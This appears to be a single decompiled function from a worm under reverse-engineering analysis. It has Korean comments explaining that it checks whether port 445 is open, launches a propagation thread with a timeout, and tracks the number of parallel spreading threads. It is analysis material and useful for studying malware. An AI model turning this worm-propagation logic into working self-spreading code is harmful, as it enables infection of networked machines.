// --- Metadata ---
// Function Name: propagateIfPortOpen_4076B0
// Address: 0x4076B0
// Exported At: 20250527_184729
// Signature: unknown_signature
// ---------------
unsigned int __stdcall propagateIfPortOpen_4076B0(void *ArgList)
{
  void *v1; // eax
  void *v2; // esi

  if ( isPort445Open_407480(ArgList) > 0 )      // 포트가 열려 있으면 전파 시도
  {
    v1 = beginthreadex(0, 0, StartAddress, ArgList, 0, 0);
    v2 = v1;
    if ( v1 )
    {
      if ( WaitForSingleObject(v1, 0x927C0u) == 258 )
        TerminateThread(v2, 0);
      CloseHandle(v2);
    }
  }
  InterlockedDecrement(&FileName[268]);         // 병렬로 실행되는 웜 전파 쓰레드 수를 추적하는 용도 
  endthreadex(0);
  return 0;
}
